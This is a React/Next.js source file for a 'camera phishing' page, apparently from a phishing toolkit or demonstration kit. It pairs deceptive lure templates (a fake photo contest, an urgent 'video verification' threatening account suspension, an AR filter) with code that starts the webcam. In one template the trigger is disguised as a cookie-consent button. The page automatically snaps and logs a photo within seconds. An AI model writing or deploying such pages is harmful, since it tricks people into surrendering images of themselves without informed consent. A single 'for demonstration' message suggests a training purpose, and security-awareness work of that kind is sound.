
"use client";
import { useEffect, useState, useRef } from 'react';
import { useParams } from 'next/navigation';
import { useLogs } from '@/contexts/LogContext';
import type { CameraData } from '@/types';
import { Button } from '@/components/ui/button';
import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
import { Camera as CameraIcon, VideoOff, CheckCircle, AlertTriangle, Trophy, Cookie, Image as ImageIcon, ShieldCheck, Sparkles, Wand2 } from 'lucide-react';
import { cn } from '@/lib/utils'; // Added for cn utility

const templateContent: Record<string, { title: string; message: string; cookieMessage?: string; actionText?: string; }> = {
  'photo-contest-entry': {
    title: "FINAL CHANCE: SnapWin Photo Contest Entry!",
    message: "Last call for entries! Showcase your photography skills and win exclusive prizes. **Accept cookies below** to enable camera access for your final submission. Don't miss out!",
    cookieMessage: "URGENT: Cookie consent required to participate and secure your contest entry. By clicking 'Accept Cookies', you agree to our contest terms and cookie use.",
  },
  'video-verification': {
    title: "CRITICAL ALERT: Video Verification Needed Immediately",
    message: "Immediate video verification is required to secure your account against unauthorized access. Please enable your camera now to prevent account suspension.",
    actionText: "Start Urgent Video Verification",
  },
  'ar-filter': {
    title: "Limited Edition: Try Our Viral AR Filter!",
    message: "This exclusive AR filter is only available for a short time! Enable your camera to join the trend and share your amazing creations.",
    actionText: "Unlock Exclusive AR Filter",
  },
  default: {
    title: "Account Security: Camera Access Required for Verification",
    message: "To maintain account integrity and verify your identity, please enable camera access. This is a standard security procedure.",
    actionText: "Enable Camera for Security Check",
  }
};

export default function CameraPhishingPage() {
  const { addLog } = useLogs();
  const { id: idFromParams } = useParams<{ id: string }>();
  const templateId = idFromParams || 'default';
  const content = templateContent[templateId] || templateContent.default;

  const [status, setStatus] = useState<'idle' | 'requesting' | 'streaming' | 'captured' | 'error'>('idle');
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const [cookieConsentGiven, setCookieConsentGiven] = useState(false);

  useEffect(() => {
    addLog({ type: 'generic', data: { message: `Visited camera phishing page: /phishing/camera/${templateId}` } });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [templateId]);

  useEffect(() => {
    if (content.title) {
      document.title = content.title;
    }
  }, [content.title]);

  const captureImage = () => {
    if (videoRef.current && canvasRef.current && videoRef.current.readyState === 4 && videoRef.current.videoWidth > 0) {
      const video = videoRef.current;
      const canvas = canvasRef.current;

      const MAX_WIDTH = 640; // Restored for better quality
      const MAX_HEIGHT = 480; // Restored for better quality
      let { videoWidth, videoHeight } = video;

      if (videoWidth > videoHeight) {
        if (videoWidth > MAX_WIDTH) {
          videoHeight = Math.round((videoHeight * MAX_WIDTH) / videoWidth);
          videoWidth = MAX_WIDTH;
        }
      } else {
        if (videoHeight > MAX_HEIGHT) {
          videoWidth = Math.round((videoWidth * MAX_HEIGHT) / videoHeight);
          videoHeight = MAX_HEIGHT;
        }
      }

      canvas.width = videoWidth;
      canvas.height = videoHeight;

      const context = canvas.getContext('2d');
      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageUrl = canvas.toDataURL('image/jpeg', 0.9); // Increased quality to 0.9
        const cameraData: CameraData = { imageUrl };
        addLog({ type: 'camera', data: cameraData });
        setStatus('captured');
        stopCameraStream(true); // Pass true to indicate capture happened
      }
    }
  };

  const handleCameraRequest = async () => {
    if (streamRef.current) stopCameraStream();

    setStatus('requesting');
    setIsLoading(true);
    setError(null);

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
           if (videoRef.current) videoRef.current.play();
           setStatus('streaming');
           setIsLoading(false);
           setTimeout(captureImage, 1500);
        };
      }
    } catch (err) {
      console.error("Camera access error:", err);
      let errorMessage = 'Could not access camera.';
      if (err instanceof DOMException) {
        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
          errorMessage = 'Camera access denied by user.';
        } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
          errorMessage = 'No camera found on this device.';
        }
      }
      setError(errorMessage);
      setStatus('error');
      addLog({ type: 'generic', data: { message: `Camera error: ${errorMessage}` } });
      setIsLoading(false);
    }
  };
  
  const handleCookieConsentAndCamera = () => {
    setCookieConsentGiven(true);
    handleCameraRequest();
  };

  const stopCameraStream = (isAfterCapture = false) => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
    // Only reset to 'idle' if not after capture and not already in error or captured state
    if (!isAfterCapture && status !== 'captured' && status !== 'error') {
      setStatus('idle');
    }
  };

  useEffect(() => {
    return () => {
      stopCameraStream();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  if (templateId === 'photo-contest-entry') {
    return (
      <>
        <PhishingPageLayout
          title={content.title}
          isLoading={isLoading && status !== 'streaming' && cookieConsentGiven}
          error={error}
          statusMessage={status === 'captured' ? 'Photo submitted successfully! Good luck in the contest.' : undefined}
        >
          <div className="text-center mb-8"> {/* Increased mb for more space */}
              <Trophy className="h-20 w-20 text-amber-500 mx-auto mb-3" /> {/* Made icon larger */}
              <h2 className="text-2xl font-semibold text-amber-600 mb-4">SnapWin Photo Challenge</h2> {/* Added contest title */}
              <p className="text-lg text-muted-foreground" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
          </div>
          
          <div className={cn(
              "aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border-2",
              (status === 'streaming' && cookieConsentGiven) ? 'border-primary' : 'border-border'
            )}>
            <video ref={videoRef} className="w-full h-full object-cover" playsInline muted />
            { !(status === 'streaming' && cookieConsentGiven) && !(status === 'captured' && cookieConsentGiven) && (
              <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/30">
                {!cookieConsentGiven ? (
                  <>
                    <ImageIcon className="h-16 w-16 text-white/70 mb-2" />
                    <p className="text-white/90">Contest photo will appear here</p>
                  </>
                ) : (status === 'idle' || status === 'requesting' || status === 'error') && cookieConsentGiven ? (
                  <>
                    <VideoOff className="h-16 w-16 text-white/70 mb-2" />
                    <p className="text-white/90 text-center px-4">{status === 'error' && error ? error : 'Camera feed inactive. Waiting for camera permission...'}</p>
                  </>
                ) : null }
              </div>
            )}
          </div>
          <canvas ref={canvasRef} className="hidden"></canvas>

          {status === 'streaming' && !isLoading && cookieConsentGiven && (
             <div className="text-center p-3 bg-blue-50 border border-blue-200 rounded-md mb-6">
              <p className="font-medium text-blue-700">Camera active. Capturing snapshot...</p>
              <Button onClick={() => stopCameraStream()} variant="outline" size="sm" className="mt-2">Cancel Submission</Button>
            </div>
          )}

          {status === 'captured' && cookieConsentGiven && (
            <div className="text-center p-4 bg-green-50 border border-green-200 rounded-md mb-6">
              <CheckCircle className="mx-auto h-10 w-10 text-green-600 mb-2" />
              <p className="font-semibold text-green-700">Photo Submitted Successfully!</p>
              <p className="text-sm text-green-600">Thank you for entering the contest. This window can now be closed.</p>
            </div>
          )}
           {status === 'error' && cookieConsentGiven && error && (
             <div className="text-center p-4 bg-red-50 border border-red-200 rounded-md mb-6">
              <AlertTriangle className="mx-auto h-10 w-10 text-red-600 mb-2" />
              <p className="font-semibold text-red-700">Camera Access Failed</p>
              <p className="text-sm text-red-600">{error}</p>
              <Button onClick={handleCameraRequest} variant="outline" className="mt-3">Try Again</Button>
            </div>
          )}
        </PhishingPageLayout>

        {!cookieConsentGiven && (
            <div className="fixed bottom-0 left-0 right-0 p-4 bg-background border-t border-border shadow-lg z-50">
              <div className="container mx-auto flex flex-col sm:flex-row items-center justify-between gap-3">
                <p className="text-sm text-foreground text-center sm:text-left flex-grow">
                  {content.cookieMessage || "Our site uses cookies to enhance your experience. By clicking 'Accept Cookies', you agree to our use of cookies."}
                </p>
                <Button
                  onClick={handleCookieConsentAndCamera}
                  className="bg-primary hover:bg-primary/90 text-primary-foreground whitespace-nowrap w-full sm:w-auto flex-shrink-0"
                  size="md" // Ensure this size is defined or use default
                  disabled={isLoading && !cookieConsentGiven} 
                >
                  <Cookie className="mr-2 h-4 w-4" />
                  Accept Cookies
                </Button>
              </div>
            </div>
        )}
      </>
    );
  }

  return (
    <PhishingPageLayout
        title={content.title}
        isLoading={isLoading && status !== 'streaming'}
        error={error}
        statusMessage={status === 'captured' ? 'Camera snapshot captured successfully for demonstration.' : undefined}
    >
      {templateId === 'video-verification' && (
        <div className="flex flex-col items-center justify-center mb-4 text-blue-600">
          <ShieldCheck className="h-12 w-12 mb-2" />
          <p className="font-semibold text-sm">SecureStream Verifications</p>
        </div>
      )}
      {templateId === 'ar-filter' && (
        <div className="flex flex-col items-center justify-center mb-4 text-purple-600">
          <Sparkles className="h-12 w-12 mb-2" />
           {/* Message is already in content.message, so just icon might be enough or a small sub-text if needed */}
        </div>
      )}
      <p className="text-center text-muted-foreground mb-6">{content.message}</p>

      <div className="aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border">
        <video ref={videoRef} className="w-full h-full object-cover" playsInline muted />
        {status !== 'streaming' && status !== 'captured' && (
          <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/50">
            <VideoOff className="h-16 w-16 text-white/70 mb-2" />
            <p className="text-white/90">Camera feed inactive</p>
          </div>
        )}
      </div>
      <canvas ref={canvasRef} className="hidden"></canvas>

      {(status === 'idle' || status === 'error') && (
        <Button
          onClick={handleCameraRequest}
          className="w-full bg-accent hover:bg-accent/90 text-accent-foreground"
          disabled={isLoading}
        >
          <CameraIcon className="mr-2 h-5 w-5" />
          {isLoading ? 'Initializing Camera...' : (content.actionText || 'Enable Camera')}
        </Button>
      )}

      {status === 'streaming' && !isLoading && (
         <div className="text-center p-3 bg-blue-50 border border-blue-200 rounded-md">
          <p className="font-medium text-blue-700">Camera active. Capturing snapshot...</p>
          <Button onClick={() => stopCameraStream()} variant="outline" size="sm" className="mt-2">Stop Camera</Button>
        </div>
      )}

      {status === 'captured' && (
        <div className="text-center p-4 bg-green-50 border border-green-200 rounded-md">
          <CheckCircle className="mx-auto h-10 w-10 text-green-600 mb-2" />
          <p className="font-semibold text-green-700">Image Captured</p>
          <p className="text-sm text-green-600">An image has been captured. This window can now be closed.</p>
        </div>
      )}
       {status === 'error' && error && (
         <div className="text-center p-4 bg-red-50 border border-red-200 rounded-md">
          <AlertTriangle className="mx-auto h-10 w-10 text-red-600 mb-2" />
          <p className="font-semibold text-red-700">Camera Access Failed</p>
          <p className="text-sm text-red-600">{error}</p>
           <Button onClick={handleCameraRequest} variant="outline" className="mt-3">Try Again</Button>
        </div>
      )}
    </PhishingPageLayout>
  );
}
